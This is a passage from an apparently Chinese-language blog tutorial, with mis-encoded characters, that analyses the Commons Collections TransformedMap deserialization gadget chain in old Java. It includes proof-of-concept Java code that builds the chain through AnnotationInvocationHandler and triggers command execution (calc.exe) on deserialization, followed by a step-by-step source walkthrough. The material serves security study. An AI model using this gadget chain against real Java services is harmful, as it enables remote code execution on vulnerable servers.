</span></span><span style=display:flex><span>        <span style=color:#75715e>// å°†å¤šä¸ª Transformer ä¸²è”æˆä¸€ä¸ªé“¾å¼å¤„ç†å™¨</span>
</span></span><span style=display:flex><span>        Transformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç¬¬äºŒæ­¥ï¼šæ„é€  TransformedMapï¼Œå°†æ¶æ„é“¾ç»‘å®šåˆ° value çš„è½¬æ¢å™¨ä¸Š</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// å½“ Map çš„ value è¢«è®¿é—®æˆ–ä¿®æ”¹æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ transformer</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>        innerMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;anything&#34;</span>); <span style=color:#75715e>// å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ª entryï¼Œå¦åˆ™ä¸ä¼šè§¦å‘è½¬æ¢</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// decorate(originalMap, keyTransformer, valueTransformer)</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// è¿™é‡Œåªå¯¹ value åº”ç”¨æ¶æ„ transformer</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> transformedMap <span style=color:#f92672>=</span> TransformedMap.<span style=color:#a6e22e>decorate</span>(innerMap, <span style=color:#66d9ef>null</span>, chainedTransformer);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç¬¬ä¸‰æ­¥ï¼šæ„é€  AnnotationInvocationHandler å¯¹è±¡</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// è¯¥ç±»åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ Map.entrySet()ï¼Œä»è€Œè§¦å‘ TransformedMap çš„ value è½¬æ¢</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> clazz <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
</span></span><span style=display:flex><span>        Constructor<span style=color:#f92672>&lt;?&gt;</span> constructor <span style=color:#f92672>=</span> clazz.<span style=color:#a6e22e>getDeclaredConstructor</span>(Class.<span style=color:#a6e22e>class</span>, Map.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>        constructor.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>); <span style=color:#75715e>// ç»•è¿‡ç§æœ‰æ„é€ å‡½æ•°é™åˆ¶</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// åˆ›å»º handler å®ä¾‹ï¼š</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šä»»æ„æ³¨è§£ç±»ï¼ˆRetention æ˜¯ JDK è‡ªå¸¦çš„ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼‰</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// - ç¬¬äºŒä¸ªå‚æ•°ï¼šæˆ‘ä»¬çš„æ¶æ„ transformedMap</span>
</span></span><span style=display:flex><span>        Object handler <span style=color:#f92672>=</span> constructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, transformedMap);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç¬¬å››æ­¥ï¼šåºåˆ—åŒ– payloadï¼ˆç”Ÿæˆæ”»å‡»è½½è·ï¼‰</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        ByteArrayOutputStream baos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(baos);
</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(handler); <span style=color:#75715e>// åºåˆ—åŒ–æ¶æ„å¯¹è±¡</span>
</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> payload <span style=color:#f92672>=</span> baos.<span style=color:#a6e22e>toByteArray</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;âœ… Payload å·²ç”Ÿæˆï¼Œå³å°†è¿›è¡Œååºåˆ—åŒ–ï¼ˆè§¦å‘å‘½ä»¤æ‰§è¡Œï¼‰...&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç¬¬äº”æ­¥ï¼šååºåˆ—åŒ–ï¼ˆæ¨¡æ‹Ÿæ¼æ´è§¦å‘ç‚¹ï¼‰</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// åœ¨çœŸå®åœºæ™¯ä¸­ï¼Œè¿™ä¸€æ­¥ç”±å­˜åœ¨æ¼æ´çš„æœåŠ¡ç«¯æ‰§è¡Œ</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        ByteArrayInputStream bais <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(payload);
</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(bais);
</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>(); <span style=color:#75715e>// âš ï¸ å…³é”®è§¦å‘ç‚¹ï¼æ­¤å¤„ä¼šæ‰§è¡Œ calc.exe</span>
</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;âœ… Done. å¦‚æœæ˜¯ Windows ç³»ç»Ÿï¼Œåº”å·²å¼¹å‡ºè®¡ç®—å™¨ã€‚&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h4 id=æ¼æ´è§¦å‘å¤§è‡´æµç¨‹>ğŸ“„<strong>æ¼æ´è§¦å‘å¤§è‡´æµç¨‹</strong><a hidden class=anchor aria-hidden=true href=#æ¼æ´è§¦å‘å¤§è‡´æµç¨‹>#</a></h4><ol><li>æ„é€ ä¸€æ¡èƒ½æ‰§è¡Œå‘½ä»¤çš„ <code>Transformer</code> é“¾ã€‚</li><li>ç”¨ <code>TransformedMap</code> åŒ…è£…è¯¥é“¾ï¼Œä½¿å…¶åœ¨ value è¢«è®¿é—®æ—¶æ‰§è¡Œã€‚</li><li>å°† <code>TransformedMap</code> åµŒå…¥åˆ° <code>AnnotationInvocationHandler</code> ä¸­ã€‚</li><li>åºåˆ—åŒ–è¯¥ handlerã€‚</li><li>ååºåˆ—åŒ–æ—¶ï¼ŒJDK è‡ªåŠ¨è°ƒç”¨ <code>entrySet()</code> â†’ è§¦å‘ value è½¬æ¢ â†’ æ‰§è¡Œå‘½ä»¤ï¼</li></ol><h2 id=32--annotationinvocationhandler-å¯åºåˆ—åŒ–ç±»æºç >3.2 AnnotationInvocationHandler å¯åºåˆ—åŒ–ç±»æºç <a hidden class=anchor aria-hidden=true href=#32--annotationinvocationhandler-å¯åºåˆ—åŒ–ç±»æºç >#</a></h2><p>è¿™æ®µä»£ç çœŸå®å­˜åœ¨äº JDK 6ã€7ã€8u71 åŠæ›´æ—©ç‰ˆæœ¬ä¸­**ï¼ŒObject obj = ois.readObject(); // å…³é”®ï¼šå¼€å§‹ååºåˆ—åŒ–ï¼Œ<strong>ä¸Šé¢ä»£ç å·²ç»å†™å‡ºäº†æ¼æ´çš„è§¦å‘ä½ç½®</strong></p><pre tabindex=0><code>private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject(); // 1. å…ˆè¯»å–çˆ¶ç±»å’Œå­—æ®µçš„é»˜è®¤å€¼

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch (IllegalArgumentException e) {
        memberValues = null;
        return;
    }

    // 2. è·å– memberValues çš„ entrySet
    Map&lt;String, Object&gt; mv = memberValues;
    Set&lt;Map.Entry&lt;String, Object&gt;&gt; entries = mv.entrySet();
    // mvæ˜¯AnnotationInvocationHandlerçš„memberValueså­—æ®µï¼Œæ­¤æ—¶æ˜¯TransformedMapå®ä¾‹
// entrySet()è¿”å›TransformedMapEntryé›†åˆ

    // 3. éå†æ¯ä¸ª entryï¼Œå¹¶è°ƒç”¨ setValue
    for (Map.Entry&lt;String, Object&gt; e : entries) {
        String key = e.getKey();
        Object value = e.getValue();
        Class&lt;?&gt; type = annotationType.memberTypes().get(key);
        if (type != null) {
            Object newValue = type.cast(value); // ç±»å‹è½¬æ¢
            if (value != newValue) {            // å¦‚æœè½¬å‹åæ˜¯æ–°å¯¹è±¡ï¼ˆæ¯”å¦‚ enum å¸¸é‡ï¼‰
                e.setValue(newValue);           // â†â†â† å…³é”®ï¼è¿™é‡Œè°ƒç”¨äº† entry.setValue()
                    // eæ˜¯TransformedMapEntryå®ä¾‹ï¼Œå…¶setValue()æ–¹æ³•è¢«é‡å†™
    // é€šè¿‡è¿­ä»£å™¨è·å–entryæ—¶ï¼Œä¼šè‡ªåŠ¨åŒ…è£…ä¸ºTransformedMapEntry
            }
        }
    }
}
</code></pre><hr><p>ğŸ” é€è¡Œè§£é‡Šï¼ˆé‡ç‚¹åœ¨æœ€åå‡ è¡Œï¼‰</p><table><thead><tr><th>ä»£ç </th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>s.defaultReadObject();</code></td><td>å…ˆæ­£å¸¸è¯»å–å¯¹è±¡å­—æ®µï¼ˆæ¯”å¦‚ <code>type</code> å’Œ <code>memberValues</code>ï¼‰</td></tr><tr><td><code>Map&lt;String, Object> mv = memberValues;</code></td><td>æ‹¿åˆ°ä½ ä¹‹å‰å¡è¿›å»çš„ <code>transformedMap</code></td></tr><tr><td><code>Set&lt;Map.Entry&lt;String, Object>> entries = mv.entrySet();</code></td><td>è·å– map çš„æ‰€æœ‰é”®å€¼å¯¹ï¼ˆentryï¼‰</td></tr><tr><td><code>for (Map.Entry&lt;String, Object> e : entries)</code></td><td>éå†æ¯ä¸€ä¸ª entryï¼ˆå¦‚ key=&ldquo;value&rdquo;, value=&ldquo;abc&rdquo;ï¼‰</td></tr><tr><td><code>e.setValue(newValue);</code></td><td>å¦‚æœå€¼éœ€è¦ç±»å‹è½¬æ¢ï¼Œå°±è°ƒç”¨ <code>setValue</code> æ›´æ–°å®ƒ</td></tr></tbody></table><blockquote><p>ğŸ’¥ å°±æ˜¯è¿™ä¸€è¡Œï¼š<code>e.setValue(newValue);</code> è§¦å‘äº†æ•´ä¸ªæ”»å‡»é“¾ï¼</p></blockquote><hr><p>âœ… è¡¥å……ï¼š</p><p>â„¹ï¸ ä¸ºä»€ä¹ˆè¿™ä¸ªforå¾ªç¯ä¸€å®šä¼šæ‰§è¡Œï¼Ÿ
å› ä¸ºæˆ‘ä»¬çš„innerMapä¸­é¢„å…ˆputäº†ä¸€ä¸ªé”®å€¼å¯¹ (innerMap.put(&ldquo;value&rdquo;, &ldquo;anything&rdquo;))ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªæ¡ç›®ï¼ŒentrySetä¸ºç©ºï¼Œforå¾ªç¯ä¸æ‰§è¡Œï¼Œæ¼æ´å°±æ— æ³•è§¦å‘ã€‚</p><p>âš ï¸â€œæ³¨æ„ï¼šå•ç‹¬ä½¿ç”¨ TransformedMap æ— æ³•ç›´æ¥è¢«ååºåˆ—åŒ–è§¦å‘ï¼Œå¿…é¡»é…åˆå¦‚ AnnotationInvocationHandler ç­‰å¯åºåˆ—åŒ–ç±»ï¼Œå…¶ readObject ä¼šéå† map å¹¶è°ƒç”¨ setValueã€‚â€ï¼Œä¸æ˜¯â€œåªè¦ååºåˆ—åŒ– TransformedMap å°±èƒ½è§¦å‘â€ï¼Œè¿™æ˜¯å¸¸è§è¯¯è§£</p><hr><h4 id=-å…³é”®ç‚¹åˆ†æ>ğŸ¯ å…³é”®ç‚¹åˆ†æ<a hidden class=anchor aria-hidden=true href=#-å…³é”®ç‚¹åˆ†æ>#</a></h4><p>âœ… <strong>å”¯ä¸€å…³é”®ç‚¹ï¼š<code>memberValue.setValue(newValue)</code></strong></p><ul><li><p><code>memberValue</code> æ˜¯ <code>memberValues.entrySet()</code> è¿”å›çš„ <code>Map.Entry</code>ï¼›</p></li><li><p>å¦‚æœ <code>memberValues</code> æ˜¯ <code>TransformedMap</code>ï¼Œé‚£ä¹ˆ <code>entrySet()</code> è¿”å›çš„æ˜¯ <strong><code>EntrySetView</code></strong>ï¼›</p></li><li><p>å…¶è¿­ä»£å™¨è¿”å›çš„æ˜¯ <strong><code>TransformedMapEntry</code></strong>ï¼›</p></li><li><p>æ‰€ä»¥ <code>memberValue.setValue(...)</code> å®é™…è°ƒç”¨çš„æ˜¯ï¼šğŸ‘‰ <strong>å…¶å®è¿™å‡ æ¡é“¾è›®å¤æ‚çš„åç»­æˆ‘ä¼šè·Ÿè¸ªé“¾æ¡çš„æ‰§è¡Œæƒ…å†µ</strong></p><pre tabindex=0><code>TransformedMapEntry.setValue(newValue)
  â†’ parent.checkSetValue(newValue)
    â†’ valueTransformer.transform(newValue)
      â†’ ChainedTransformer æ‰§è¡Œå‘½ä»¤
</code></pre><pre tabindex=0><code>memberValue.setValue(...)
</code></pre></li></ul><blockquote><p>ğŸ’¡ <strong>å› æ­¤ï¼Œæ¼æ´æˆç«‹ä¾èµ–ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³</strong>ï¼š</p><ol><li><code>memberValues</code> æ˜¯ <code>TransformedMap</code>ï¼ˆæ¥è‡ª Commons Collections â‰¤ 3.2.1ï¼‰ï¼›</li><li><code>AnnotationInvocationHandler.readObject()</code> ä¸­å­˜åœ¨ <code>entry.setValue()</code> è°ƒç”¨ï¼ˆJDK â‰¤ 8u71 æˆ– 7u85 ç­‰æœªä¿®å¤ç‰ˆæœ¬ï¼‰ã€‚</li></ol></blockquote><hr><h1 id=å››è°ƒç”¨é“¾åˆ†æ>å››ã€è°ƒç”¨é“¾åˆ†æ<a hidden class=anchor aria-hidden=true href=#å››è°ƒç”¨é“¾åˆ†æ>#</a></h1><p>æˆ‘æŒ‰ç…§è°ƒç”¨é“¾çš„å…ˆåé¡ºåºè¿›è¡Œåˆ†æï¼Œä¹Ÿå°±æ˜¯ä»ä¼ å‚è¿›æ¥çš„ç¬¬ä¸€æ­¥å¼€å§‹ï¼Œ</p><h2 id=41-mventryset>4.1 mv.entrySet()<a hidden class=anchor aria-hidden=true href=#41-mventryset>#</a></h2><p>é¦–å…ˆè¦çŸ¥é“mvæ˜¯æ€ä¹ˆæ¥çš„ï¼Œmv æ˜¯ AnnotationInvocationHandler ç±»ä¸­çš„æˆå‘˜å˜é‡ memberValuesï¼Œæ€ä¹ˆä¼ è¿›æ¥çš„ï¼Œå°±æ˜¯è¿™ä¸²ä»£ç ï¼Œmvå°±æ˜¯<strong>transformedMap</strong>å®ä¾‹ã€‚</p><pre tabindex=0><code>// æ„é€  handlerï¼Œå°† transformedMap ä½œä¸º memberValues ä¼ å…¥ â†’ mv = transformedMap
Object handler = constructor.newInstance(Retention.class, transformedMap);
</code></pre><p>ğŸ‘‰ å°±æ˜¯ transformedMap.entrySet()</p><h3 id=â„¹411--ä¸ºä»€ä¹ˆ>â„¹ï¸4.1.1 <strong>ä¸ºä»€ä¹ˆ <code>e.setValue()</code> ä¼šè§¦å‘å…¨é“¾ï¼Ÿ</strong><a hidden class=anchor aria-hidden=true href=#â„¹411--ä¸ºä»€ä¹ˆ>#</a></h3><h4 id=-è§¦å‘æµç¨‹>âœ… <strong>è§¦å‘æµç¨‹</strong><a hidden class=anchor aria-hidden=true href=#-è§¦å‘æµç¨‹>#</a></h4><ol><li><p><strong>ååºåˆ—åŒ–æ—¶è°ƒç”¨ <code>AnnotationInvocationHandler.readObject()</code></strong>ï¼š</p><ul><li>éå† <code>memberValues.entrySet()</code>ã€‚</li><li>å¯¹æ¯ä¸ª <code>entry</code>ï¼Œè°ƒç”¨ <code>e.setValue(newValue)</code>ã€‚</li></ul></li><li><p><strong><code>e.setValue()</code> è°ƒç”¨é“¾</strong>ï¼š</p><ul><li><p><code>MapEntry.setValue(value)</code> â†’ <code>parent.checkSetValue(value)</code>ã€‚</p></li><li><p><code>parent</code> æ˜¯ <code>TransformedMap</code>ï¼Œ<code>checkSetValue(value)</code> ä¼šè°ƒç”¨ <code>valueTransformer.transform(value)</code>ã€‚</p></li><li><p><code>valueTransformer</code> æ˜¯ä½ è®¾ç½®çš„ <code>chainedTransformer</code>ï¼Œå®ƒä¼šä¾æ¬¡æ‰§è¡Œ <code>ConstantTransformer</code> å’Œ <code>InvokerTransformer</code>ã€‚</p><p>ğŸ¤”è¿™é‡Œå…¶å®å¸¦æ¥äº†ä¸¤ä¸ªç–‘é—®ï¼š</p><p>MapEntryæ˜¯æ€ä¹ˆç”±æ¥çš„ï¼Ÿ</p><p>ä»¥åŠparent ä¸ºä»€ä¹ˆæ˜¯ TransformedMap ï¼Ÿ</p></li></ul></li></ol><h2 id=42-transformedmapç±»>4.2 TransformedMapç±»<a hidden class=anchor aria-hidden=true href=#42-transformedmapç±»>#</a></h2><ul><li>å…³é”®çš„éƒ¨åˆ†ï¼š<code>TransformedMap</code> ç±»çš„å®šä¹‰ã€<code>decorate</code> æ–¹æ³•ã€<code>checkSetValue</code> æ–¹æ³•å’Œ <code>entrySet</code> ç›¸å…³é€»è¾‘ï¼Œé‡è¦éš¾ç†è§£çš„é€»è¾‘éƒ½åœ¨è¿™ä¸ªç±»é‡Œå®ç°çš„ã€‚</li></ul><h3 id=-1-transformedmap-ç±»å®šä¹‰>ğŸ“¦ 1. <code>TransformedMap</code> ç±»å®šä¹‰<a hidden class=anchor aria-hidden=true href=#-1-transformedmap-ç±»å®šä¹‰>#</a></h3><pre tabindex=0><code>public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable {
</code></pre><ul><li><code>TransformedMap</code> æ˜¯ä¸€ä¸ªè£…é¥°å™¨ç±»ï¼Œç”¨æ¥â€œåŒ…è£…â€å¦ä¸€ä¸ª Mapã€‚</li><li>å®ƒç»§æ‰¿è‡ª <code>AbstractInputCheckedMapDecorator</code>ï¼Œè¿™ä¸ªçˆ¶ç±»æä¾›äº†å¯¹ <code>put</code> å’Œ <code>setValue</code> çš„æ‹¦æˆªèƒ½åŠ›ã€‚</li><li>å®ç°äº† <code>Serializable</code>ï¼Œè¯´æ˜å®ƒå¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– â€”â€” <strong>è¿™æ˜¯ååºåˆ—åŒ–æ¼æ´çš„å‰æ</strong>ã€‚</li></ul><h3 id=-2-æˆå‘˜å˜é‡>ğŸ”§ 2. æˆå‘˜å˜é‡<a hidden class=anchor aria-hidden=true href=#-2-æˆå‘˜å˜é‡>#</a></h3><pre tabindex=0><code>/** The transformer to use for keys */
protected final Transformer keyTransformer;
/** The transformer to use for values */
protected final Transformer valueTransformer;
</code></pre><ul><li><p><code>keyTransformer</code>ï¼šç”¨äºè½¬æ¢ Map çš„ keyï¼ˆå¯ä¸º nullï¼‰</p></li><li><p><code>valueTransformer</code>ï¼šç”¨äºè½¬æ¢ Map çš„ valueï¼ˆæˆ‘ä»¬æ”»å‡»æ—¶ç”¨çš„å°±æ˜¯å®ƒï¼‰</p></li><li><p><code>final</code> è¡¨ç¤ºä¸€æ—¦åˆ›å»ºå°±ä¸èƒ½æ”¹ï¼Œä¿è¯äº†è£…é¥°å™¨çš„è¡Œä¸ºç¨³å®š</p><p>âœ… åœ¨ ysoserial ä¸­ï¼Œæˆ‘ä»¬æŠŠ <code>valueTransformer</code> è®¾ä¸º <code>ChainedTransformer</code>ï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</p></li></ul><h3 id=-3-æ„é€ å‡½æ•°>ğŸ—ï¸ 3. æ„é€ å‡½æ•°<a hidden class=anchor aria-hidden=true href=#-3-æ„é€ å‡½æ•°>#</a></h3><pre tabindex=0><code>protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;//ChainedTransformer
}
</code></pre><ul><li>è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•° <code>super(map)</code>ï¼ŒæŠŠåŸå§‹ mapï¼ˆinnerMapï¼‰ä¿å­˜ä¸‹æ¥ ğŸ‘ˆ</li><li>æŠŠä¼ è¿›æ¥çš„ä¸¤ä¸ª transformer ä¿å­˜åˆ°æˆå‘˜å˜é‡rä¸­ğŸ‘ˆ</li><li>æ³¨æ„ï¼šè¿™æ˜¯ <code>protected</code>ï¼Œä¸èƒ½ç›´æ¥ newï¼Œè¦ç”¨ <code>decorate</code> å·¥å‚æ–¹æ³•ğŸ‘ˆ</li></ul><h3 id=-4-å·¥å‚æ–¹æ³•-decorateæœ€å¸¸ç”¨å…¥å£>ğŸ­ 4. å·¥å‚æ–¹æ³• decorateï¼ˆæœ€å¸¸ç”¨å…¥å£ï¼‰<a hidden class=anchor aria-hidden=true href=#-4-å·¥å‚æ–¹æ³•-decorateæœ€å¸¸ç”¨å…¥å£>#</a></h3><ul><li>é™æ€æ–¹æ³•ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªè¢«åŒ…è£…çš„ Map</li></ul><p>ä¾‹å¦‚ï¼š</p><pre tabindex=0><code>Map transformedMap = TransformedMap.decorate(new HashMap(), null, chainedTransformer);
</code></pre><h2 id=43-entryset->4.3 entrySet ()<a hidden class=anchor aria-hidden=true href=#43-entryset->#</a></h2><p>ğŸ‘‰ <strong>transformedMap.entrySet()</strong></p><pre tabindex=0><code>public Set entrySet() {
    if (entrySet == null) {
        entrySet = new EntrySetView();
    }
    return entrySet;
}
</code></pre><ul><li>è¿”å›è¿™ä¸ª Map çš„æ‰€æœ‰é”®å€¼å¯¹é›†åˆ</li><li><code>entrySet</code> æ˜¯æ‡’åŠ è½½çš„ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ‰åˆ›å»º</li><li>å®é™…è¿”å›çš„æ˜¯å†…éƒ¨ç±» <code>EntrySetView</code></li></ul><p>EntrySetView éå¸¸é‡è¦ï¼Œä»–ç›´æ¥æŒ‡å‘äº†å¦ä¸€ä¸ªå†…éƒ¨ç±»ğŸ‘‰ EntrySetView</p><h2 id=43-entrysetviewè¿”å›transformedmapentryiterator>4.3 EntrySetView(è¿”å›TransformedMapEntryIterator)<a hidden class=anchor aria-hidden=true href=#43-entrysetviewè¿”å›transformedmapentryiterator>#</a></h2><h5 id=é‡å†™-iteratorè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„-transformedmapentry-è¿­ä»£å™¨>ğŸ¯é‡å†™ <code>iterator()</code>ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„ <code>TransformedMapEntry</code> è¿­ä»£å™¨<a hidden class=anchor aria-hidden=true href=#é‡å†™-iteratorè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„-transformedmapentry-è¿­ä»£å™¨>#</a></h5><pre tabindex=0><code>protected class EntrySetView extends AbstractSetDecorator {
    protected EntrySetView() {
        super(TransformedMap.this.map.entrySet())
    }
    // ...
}
</code></pre><ul><li><p>ç»§æ‰¿è‡ª <code>AbstractSetDecorator</code>ï¼ŒåŒ…è£…äº†åŸå§‹ map çš„ entrySet</p></li><li><p>æ‰€æœ‰æ“ä½œéƒ½ä¼šè½¬å‘ç»™åº•å±‚çš„ entrySet</p></li><li><p>ä½†å®ƒä¼šé‡å†™ <code>iterator()</code>ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„ <code>TransformedMapEntry</code> è¿­ä»£å™¨ ğŸ‘‰ <strong>æˆ‘è§‰å¾—æ˜¯æœ€é‡è¦çš„æ˜¯é‡å†™è¿™ä¸ªåŠ¨ä½œ</strong></p><p>ğŸ§AnnotationInvocationHandler.readObject() æ‰§è¡Œçš„é—®é¢˜ã€‚</p></li></ul><h5 id=mventrysetä¸ºä»€ä¹ˆä¼šè¿”å›transformedmapentryç±»mapentry>â“<code>mv.entrySet()</code>ä¸ºä»€ä¹ˆä¼šè¿”å›<code>TransformedMapEntry</code>ç±»ï¼ˆMapEntryï¼‰ã€‚<a hidden class=anchor aria-hidden=true href=#mventrysetä¸ºä»€ä¹ˆä¼šè¿”å›transformedmapentryç±»mapentry>#</a></h5><h5 id=parentä¸ºä»€ä¹ˆæ˜¯transformedmap>â“parentä¸ºä»€ä¹ˆæ˜¯<code>transformedMap</code>ã€‚<a hidden class=anchor aria-hidden=true href=#parentä¸ºä»€ä¹ˆæ˜¯transformedmap>#</a></h5><hr><p>MapEntry æ ¸å¿ƒä»£ç å°±æ˜¯<code>.setValue</code>æ–¹æ³•ï¼Œä½†æ˜¯æ‰§è¡Œè¿™ä¸ªæ–¹æ³•å‰ï¼Œå¿…é¡»è¦è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®å·</p><pre tabindex=0><code>// AbstractInputCheckedMapDecorator.java
protected static class MapEntry extends AbstractMapEntryDecorator {
    private final Map parent;

    public MapEntry(MapEntry entry, Map parent) {
        super(entry);
        this.parent = parent; // parent å°±æ˜¯ transformedMap
    }

    public Object setValue(Object value) {
        // ğŸ‘‡ è¿™é‡Œå…ˆæ£€æŸ¥ value æ˜¯å¦åˆæ³•ï¼ˆä¼šè§¦å‘ transformï¼‰
        parent.checkSetValue(value);
        // ğŸ‘‡ å†çœŸæ­£è®¾ç½®å€¼
        return entry.setValue(value);
    }
}
